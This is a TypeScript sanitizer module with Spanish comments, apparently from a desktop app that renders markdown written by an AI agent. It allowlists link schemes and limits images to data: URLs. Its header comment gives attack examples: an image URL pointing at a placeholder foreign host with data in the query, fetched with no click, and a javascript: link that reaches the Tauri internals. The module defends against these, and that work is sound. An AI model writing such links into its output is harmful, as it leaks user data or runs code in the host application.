/**
 * Qué destino de un enlace y qué origen de una imagen se aceptan cuando el
 * contenido lo escribió un agente sobre material que no es de confianza.
 *
 * Sin este filtro, `![](http://ajeno/?d=…)` dispara el GET al pintarse, sin un
 * clic, y un `[x](javascript:…)` ejecuta al pulsarlo y alcanza
 * `window.__TAURI_INTERNALS__` (medido en `tests/security/window.mjs`).
 *
 * Lo usan los dos lados de la misma frontera: `ui/Markdown.tsx` (respuesta del
 * agente) y `lib/sandbox.ts` (bloques del marco de artefactos). Dos copias
 * divergen, y la que se quede atrás es la que se ataca. Sin dependencias:
 * `tests/unit/links.test.ts` lo importa desde Node a secas.
 *
 * Las dos son listas de lo que pasa, no de lo que se rechaza: el navegador
 * borra tabuladores y saltos de línea antes de resolver el esquema, así que
 * `java\tscript:` no se parece a `javascript:` para un `grep` y sí para él.
 */

/** Un destino más largo que esto no es un enlace, es una carga útil. */
const TOPE_DESTINO = 2000;

export type InternalTaskLink = { workspace: string; folder: string; task: string };

/** Enlaces del chat a tareas del mismo workspace; el espacio sale de la tarea. */
export function internalTaskLink(value: unknown): InternalTaskLink | null {
  if (typeof value !== "string" || value.length > TOPE_DESTINO || !value.startsWith("terminus://task?")) return null;
  let url: URL;
  try {
    url = new URL(value);
  } catch {
    return null;
  }
  if (url.protocol !== "terminus:" || url.hostname !== "task" || url.pathname || url.hash ||
    url.username || url.password || url.port) return null;
  // Se cuentan las claves: `searchParams.size` no existe en WebKit 16.
  if ([...url.searchParams.keys()].length !== 3) return null;
  for (const key of ["workspace", "folder", "task"]) {
    if (url.searchParams.getAll(key).length !== 1) return null;
  }
  const workspace = url.searchParams.get("workspace") ?? "";
  const folder = url.searchParams.get("folder") ?? "";
  const task = url.searchParams.get("task") ?? "";
  const id = (s: string) => /^[a-zA-Z0-9_-]+$/.test(s);
  return id(workspace) && (!folder || id(folder)) && id(task) ? { workspace, folder, task } : null;
}

/**
 * El destino, si es de los que abriría un navegador; `null` si no. Solo
 * `https:`, `http:` y `mailto:`. Fuera: `javascript:` ejecuta, `data:` y
 * `blob:` traen documento con script propio, `file:` lee el disco, y `tauri:`,
 * `ipc:` y `asset:` son la frontera con Rust.
 */
export function destinoAbrible(v: unknown): string | null {
  if (typeof v !== "string") return null;
  if (!/^(https?|mailto):/i.test(v)) return null;
  return v.slice(0, TOPE_DESTINO);
}

// Las rutas se abren en el visor por un clic; nunca navegan la ventana.
export function localFilePath(value: unknown): string | null {
  if (typeof value !== "string") return null;
  let path: string;
  try {
    path = decodeURIComponent(value);
  } catch {
    return null;
  }
  if (/[\u0000-\u001f\u007f]/.test(path)) return null;
  // Markdown escribe una ruta de Windows como `/C:/x.html`; con esa barra delante el disco no la abre.
  path = path.replace(/^\/([a-z]:[\/\\])/i, "$1");
  if (/^\/(?![\/\\])/.test(path) || /^[a-z]:[\/\\]/i.test(path)) {
    return path;
  }
  return null;
}

/**
 * El origen de la imagen, si no pide red; `null` si no. Solo `data:`: una
 * imagen remota exfiltra sin JavaScript y sin clic, con el contenido en la URL.
 *
 * `data:image/svg+xml` entra: un SVG cargado por `<img>` corre en modo estático
 * seguro, sin scripts ni referencias externas. Esto decide qué se pinta; qué se
 * puede pedir lo decide la política de la ventana (`img-src 'self' data:`).
 */
export function imagenInerte(v: unknown): string | null {
  if (typeof v !== "string") return null;
  if (!/^data:image\//i.test(v)) return null;
  return v;
}

/**
 * La ruta en disco de una imagen que nombra la respuesta (`/x.png`, `C:\\x.png`
 * o `file:///x.png`), o `null`. La ventana la pide a `terminus-image`
 * (`src-tauri/src/local_image.rs`), que repite el filtro por extensión.
 */
export function imagenLocal(v: unknown): string | null {
  if (typeof v !== "string") return null;
  const ruta = localFilePath(v.replace(/^file:\/\/(?:localhost)?(?=\/)/i, ""));
  if (!ruta || !/\.(png|jpe?g|gif|webp|avif|bmp|ico|svg)$/i.test(ruta)) return null;
  return ruta;
}

/**
 * El clic en un enlace web del chat. Con el modificador de la plataforma —⌘ en
 * macOS, Ctrl en el resto— sale directo al navegador; sin él, `abrirPanel`
 * ofrece la elección. Ctrl no cuenta en macOS: allí Ctrl+clic es el clic derecho.
 */
export function clicEnEnlaceWeb(
  e: MouseEvent,
  destino: string,
  abrirPanel: (e: MouseEvent) => void,
  mac: boolean,
) {
  e.preventDefault();
  if (mac ? e.metaKey : e.ctrlKey) {
    window.dispatchEvent(new CustomEvent("harness:abrir-fuera", { detail: destino }));
    return;
  }
  abrirPanel(e);
}

export type TrozoDeTexto = { texto: string; url: string | null };

const URL_EN_TEXTO = /https?:\/\/[^\s<>"'`]+/gi;

/**
 * El texto plano partido en trozos, con las URL web enlazables marcadas. Unir
 * los `texto` devuelve la entrada intacta. El signo que cierra una frase no
 * entra en la URL, y un `)` solo entra si abre su par dentro de ella.
 */
export function enlacesEnTexto(texto: string): TrozoDeTexto[] {
  const trozos: TrozoDeTexto[] = [];
  let desde = 0;
  for (const m of texto.matchAll(URL_EN_TEXTO)) {
    let url = m[0];
    for (;;) {
      const ultimo = url.at(-1) ?? "";
      if (".,;:!?]}".includes(ultimo)) url = url.slice(0, -1);
      else if (ultimo === ")" && url.split("(").length < url.split(")").length) url = url.slice(0, -1);
      else break;
    }
    const inicio = m.index;
    if (url.length > TOPE_DESTINO || !/^https?:\/\/[^/?#]/i.test(url) || destinoAbrible(url) !== url) continue;
    if (inicio > desde) trozos.push({ texto: texto.slice(desde, inicio), url: null });
    trozos.push({ texto: url, url });
    desde = inicio + url.length;
  }
  if (desde < texto.length) trozos.push({ texto: texto.slice(desde), url: null });
  return trozos;
}
